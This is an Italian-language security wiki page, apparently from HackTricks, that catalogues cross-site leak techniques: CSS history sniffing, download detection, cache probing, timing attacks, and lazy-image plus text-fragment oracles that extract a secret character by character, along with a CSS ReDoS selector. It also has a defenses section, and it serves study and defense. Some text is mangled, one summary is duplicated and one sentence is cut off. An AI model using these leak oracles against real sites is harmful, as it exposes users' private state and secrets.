Le applicazioni web possono cambiare lo **stile del sito web** a seconda dello stato dell'utente. I file CSS cross-origin possono essere incorporati nella pagina dell'attaccante con l'**elemento link HTML**, e le **regole** verranno **applicate** alla pagina dell'attaccante. Se una pagina cambia dinamicamente queste regole, un attaccante pu√≤ **rilevare** queste **differenze** a seconda dello stato dell'utente.\
Come tecnica di divulgazione, l'attaccante pu√≤ utilizzare il metodo `window.getComputedStyle` per **leggere le propriet√† CSS** di un determinato elemento HTML. Di conseguenza, un attaccante pu√≤ leggere propriet√† CSS arbitrarie se l'elemento interessato e il nome della propriet√† sono noti.

### Cronologia CSS

* **Metodi di inclusione**: Elementi HTML
* **Differenza rilevabile**: Contenuto della pagina
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Sommario**: Rilevare se lo stile `:visited` viene applicato a un URL, indicando che √® gi√† stato visitato
* **Esempio di codice**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Secondo [**questo**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), questo non funziona in Chrome headless.
{% endhint %}

Il selettore CSS `:visited` viene utilizzato per stilizzare gli URL in modo diverso se sono stati visitati in precedenza dall'utente. In passato, il metodo `getComputedStyle()` poteva essere utilizzato per identificare queste differenze di stile. Tuttavia, i browser moderni hanno implementato misure di sicurezza per impedire a questo metodo di rivelare lo stato di un link. Queste misure includono il restituire sempre lo stile calcolato come se il link fosse stato visitato e il limitare gli stili che possono essere applicati con il selettore `:visited`.

Nonostante queste restrizioni, √® possibile individuare lo stato visitato di un link in modo indiretto. Una tecnica consiste nel ingannare l'utente affinch√© interagisca con un'area influenzata dal CSS, utilizzando specificamente la propriet√† `mix-blend-mode`. Questa propriet√† consente di mescolare gli elementi con il loro sfondo, rivelando potenzialmente lo stato visitato in base all'interazione dell'utente.

Inoltre, la rilevazione pu√≤ essere ottenuta senza interazione dell'utente sfruttando i tempi di rendering dei link. Poich√© i browser possono renderizzare i link visitati e non visitati in modo diverso, ci√≤ pu√≤ introdurre una differenza di tempo misurabile nel rendering. √à stato menzionato un proof of concept (PoC) in un rapporto di bug di Chromium, che dimostra questa tecnica utilizzando pi√π link per amplificare la differenza di tempo, rendendo cos√¨ lo stato visitato rilevabile attraverso l'analisi temporale.

Per ulteriori dettagli su queste propriet√† e metodi, visita le loro pagine di documentazione:
- `:visited`: [Documentazione MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()`: [Documentazione MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode`: [Documentazione MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)
### ContentDocument X-Frame Leak

* **Metodi di inclusione**: Frames
* **Differenza rilevabile**: Headers
* **Ulteriori informazioni**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Sommario**: In Google Chrome, viene visualizzata una pagina di errore dedicata quando una pagina viene bloccata dal essere incorporata in un sito di origine incrociata a causa delle restrizioni di X-Frame-Options.
* **Esempio di codice**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

In Chrome, se una pagina con l'intestazione `X-Frame-Options` impostata su "deny" o "same-origin" viene incorporata come oggetto, viene visualizzata una pagina di errore. Chrome restituisce in modo univoco un oggetto documento vuoto (anzich√© `null`) per la propriet√† `contentDocument` di questo oggetto, a differenza degli iframe o di altri browser. Gli attaccanti potrebbero sfruttare ci√≤ rilevando il documento vuoto, rivelando potenzialmente informazioni sullo stato dell'utente, soprattutto se gli sviluppatori impostano in modo inconsistente l'intestazione X-Frame-Options, spesso trascurando le pagine di errore. La consapevolezza e l'applicazione coerente delle intestazioni di sicurezza sono cruciali per prevenire tali falle.


### Rilevamento del download

* **Metodi di inclusione**: Frames, Pop-up
* **Differenza rilevabile**: Headers
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Sommario**: Un attaccante pu√≤ individuare i download di file sfruttando gli iframe; la continuit√† dell'accessibilit√† dell'iframe implica un download di file riuscito.
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

L'intestazione `Content-Disposition`, in particolare `Content-Disposition: attachment`, istruisce il browser a scaricare il contenuto anzich√© visualizzarlo inline. Questo comportamento pu√≤ essere sfruttato per rilevare se un utente ha accesso a una pagina che attiva un download di file. Nei browser basati su Chromium, ci sono alcune tecniche per rilevare questo comportamento di download:

1. **Monitoraggio della barra di download**:
- Quando viene scaricato un file nei browser basati su Chromium, compare una barra di download nella parte inferiore della finestra del browser.
- Monitorando le modifiche dell'altezza della finestra, gli attaccanti possono dedurre l'apparizione della barra di download, suggerendo che √® stato avviato un download.

2. **Navigazione del download con gli iframe**:
- Quando una pagina attiva un download di file utilizzando l'intestazione `Content-Disposition: attachment`, non provoca un evento di navigazione.
- Caricando il contenuto in un iframe e monitorando gli eventi di navigazione, √® possibile verificare se la disposizione del contenuto provoca un download di file (nessuna navigazione) o meno.

3. **Navigazione del download senza gli iframe**:
- Simile alla tecnica degli iframe, questo metodo prevede l'utilizzo di `window.open` anzich√© di un iframe.
- Monitorando gli eventi di navigazione nella finestra appena aperta, √® possibile scoprire se √® stato attivato un download di file (nessuna navigazione) o se il contenuto viene visualizzato inline (si verifica una navigazione).

In scenari in cui solo gli utenti con accesso possono attivare tali download, queste tecniche possono essere utilizzate per dedurre indirettamente lo stato di autenticazione dell'utente in base alla risposta del browser alla richiesta di download.

### Bypass della cache HTTP partizionata <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Metodi di inclusione**: Pop-up
* **Differenza rilevabile**: Timing
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Sommario**: Un attaccante pu√≤ individuare i download di file sfruttando gli iframe; la continuit√† dell'accessibilit√† dell'iframe implica un download di file riuscito.
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (da [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Ecco perch√© questa tecnica √® interessante: Chrome ora ha **partizionamento della cache**, e la chiave di cache della pagina appena aperta √®: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, ma se apro una pagina ngrok e uso fetch in essa, la chiave di cache sar√†: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **chiave di cache √® diversa**, quindi la cache non pu√≤ essere condivisa. Puoi trovare ulteriori dettagli qui: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Commento da [**qui**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Se un sito `example.com` include una risorsa da `*.example.com/resource`, allora quella risorsa avr√† la **stessa chiave di cache** come se la risorsa fosse stata richiesta direttamente tramite una navigazione di primo livello. Questo perch√© la chiave di cache √® composta da _eTLD+1_ di primo livello e _eTLD+1_ del frame.

Poich√© l'accesso alla cache √® pi√π veloce del caricamento di una risorsa, √® possibile provare a cambiare la posizione di una pagina e annullarla 20 ms (ad esempio) dopo. Se l'origine √® stata modificata dopo l'interruzione, significa che la risorsa √® stata memorizzata nella cache.\
Oppure √® possibile **inviare una richiesta fetch alla pagina potenzialmente memorizzata nella cache e misurare il tempo impiegato**.

### Reindirizzamento manuale <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Metodi di inclusione**: Fetch API
* **Differenza rilevabile**: Reindirizzamenti
* **Ulteriori informazioni**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Sommario**: √à possibile scoprire se una risposta a una richiesta fetch √® un reindirizzamento
* **Esempio di codice**:

![](<../.gitbook/assets/image (652).png>)

### Fetch con AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Metodi di inclusione**: Fetch API
* **Differenza rilevabile**: Timing
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Sommario**: √à possibile provare a caricare una risorsa e interrompere il caricamento prima che venga completato. A seconda che venga generato un errore o meno, la risorsa √® stata o meno memorizzata nella cache.
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Utilizza _**fetch**_ e _**setTimeout**_ con un **AbortController** per rilevare sia se la **risorsa
### Inquinamento dello script

* **Metodi di inclusione**: Elementi HTML (script)
* **Differenza rilevabile**: Contenuto della pagina
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Sommario**: √à possibile sovrascrivere le funzioni integrate e leggere i loro argomenti anche da uno **script cross-origin** (che non pu√≤ essere letto direttamente), ci√≤ potrebbe **rivelare informazioni preziose**.
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Metodi di inclusione**: Pop-up
* **Differenza rilevabile**: Contenuto della pagina
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Sommario**: Misura il tempo di esecuzione di un sito web utilizzando i service worker.
* **Esempio di codice**:

Nello scenario dato, l'attaccante prende l'iniziativa di registrare un **service worker** all'interno di uno dei loro domini, specificamente "attacker.com". Successivamente, l'attaccante apre una nuova finestra nel sito di destinazione dal documento principale e istruisce il **service worker** a avviare un timer. Mentre la nuova finestra inizia a caricarsi, l'attaccante naviga il riferimento ottenuto nel passaggio precedente verso una pagina gestita dal **service worker**.

All'arrivo della richiesta avviata nel passaggio precedente, il **service worker** risponde con un codice di stato **204 (No Content)**, interrompendo efficacemente il processo di navigazione. A questo punto, il **service worker** cattura una misurazione dal timer avviato in precedenza nel secondo passaggio. Questa misurazione √® influenzata dalla durata del JavaScript che causa ritardi nel processo di navigazione.

{% hint style="warning" %}
In un timing di esecuzione √® possibile **eliminare** i **fattori di rete** per ottenere **misure pi√π precise**. Ad esempio, caricando le risorse utilizzate dalla pagina prima di caricarla.
{% endhint %}

### Fetch Timing

* **Metodi di inclusione**: Fetch API
* **Differenza rilevabile**: Timing (generalmente dovuto al contenuto della pagina, codice di stato)
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Sommario**: Utilizza [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) per misurare il tempo impiegato per effettuare una richiesta. Altri orologi potrebbero essere utilizzati.
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Metodi di inclusione**: Pop-up
* **Differenza rilevabile**: Timing (generalmente dovuto al contenuto della pagina, codice di stato)
* **Ulteriori informazioni**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Sommario**: Utilizza [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) per misurare il tempo impiegato per effettuare una richiesta utilizzando `window.open`. Altri orologi potrebbero essere utilizzati.
* **Esempio di codice**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro basati sugli strumenti della comunit√† pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Con HTML o reiniezione

Qui puoi trovare tecniche per esfiltrare informazioni da un HTML cross-origin **iniettando contenuto HTML**. Queste tecniche sono interessanti nei casi in cui per qualsiasi motivo puoi **iniettare HTML ma non puoi iniettare codice JS**.

### Markup sospeso

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Caricamento ritardato delle immagini

Se hai bisogno di **esfiltrare contenuto** e puoi **aggiungere HTML prima del segreto**, dovresti controllare le **tecniche comuni di markup sospeso**.\
Tuttavia, se per qualsiasi motivo **DEVI** farlo **carattere per carattere** (forse la comunicazione avviene tramite un hit della cache), puoi usare questo trucco.

Le **immagini** in HTML hanno un attributo "**loading**" il cui valore pu√≤ essere "**lazy**". In tal caso, l'immagine verr√† caricata quando verr√† visualizzata e non durante il caricamento della pagina:
```html
<img src=/something loading=lazy >
```
Quindi, ci√≤ che puoi fare √® **aggiungere molti caratteri di spazzatura** (ad esempio **migliaia di "W"**) per **riempire la pagina web prima del segreto o aggiungere qualcosa come** `<br><canvas height="1850px"></canvas><br>.`\
Quindi, se ad esempio la nostra **iniezione appare prima della flag**, l'**immagine** verr√† **caricata**, ma se appare **dopo** la **flag**, la flag + la spazzatura **impediranno il caricamento** (dovrai giocare con la quantit√† di spazzatura da inserire). Questo √® ci√≤ che √® successo in [**questo writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Un'altra opzione sarebbe utilizzare il **scroll-to-text-fragment** se consentito:

#### Scroll-to-text-fragment

Tuttavia, fai s√¨ che il **bot acceda alla pagina** con qualcosa del genere
```
#:~:text=SECR
```
Quindi la pagina web sar√† qualcosa del genere: **`https://victim.com/post.html#:~:text=SECR`**

Dove post.html contiene i caratteri di junk dell'attaccante e l'immagine di caricamento lento e poi viene aggiunto il segreto del bot.

Ci√≤ che questo testo far√† √® far s√¨ che il bot acceda a qualsiasi testo nella pagina che contiene il testo `SECR`. Poich√© quel testo √® il segreto ed √® proprio **sotto l'immagine**, l'**immagine si caricher√† solo se il segreto indovinato √® corretto**. Quindi hai il tuo oracolo per **esfiltrare il carattere segreto uno per uno**.

Ecco un esempio di codice per sfruttare questo: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Caricamento lento dell'immagine basato sul tempo

Se **non √® possibile caricare un'immagine esterna** che potrebbe indicare all'attaccante che l'immagine √® stata caricata, un'altra opzione sarebbe provare a **indovinare il carattere pi√π volte e misurare**. Se l'immagine viene caricata, tutte le richieste richiederanno pi√π tempo rispetto a quando l'immagine non viene caricata. Questo √® ci√≤ che √® stato utilizzato nella [**soluzione di questo writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **riassunta qui:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Se viene utilizzato `jQuery(location.hash)`, √® possibile scoprire tramite il timing **se esiste qualche contenuto HTML**, questo perch√© se il selettore `main[id='site-main']` non corrisponde, non √® necessario controllare il resto dei **selettori**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Iniezione CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Difese

Ci sono mitigazioni raccomandate in [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) anche in ogni sezione del wiki [https://xsleaks.dev/](https://xsleaks.dev/). Dai un'occhiata l√¨ per ulteriori informazioni su come proteggersi da queste tecniche.

## Riferimenti

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare facilmente flussi di lavoro** supportati dagli strumenti comunitari **pi√π avanzati al mondo**.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
